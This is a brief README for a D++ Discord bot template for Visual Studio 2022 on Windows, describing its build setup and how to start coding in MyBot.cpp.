# D++ Windows Bot Template

A [D++](https://github.com/brainboxdotcc/DPP) Discord Bot template for Visual Studio 2022 (x64 and x86, release and debug). This repository is the result of [this tutorial](https://dpp.dev/build-a-discord-bot-windows-visual-studio.html) with additional enhancements for automatic selection of the correct architecture, and copying of the dll files into the correct folders on successful build.

This template comes packaged with the latest master branch of D++ from the CI. To use this project simply put your code into the `MyBot.cpp` and press F7. You can do much more with this template.
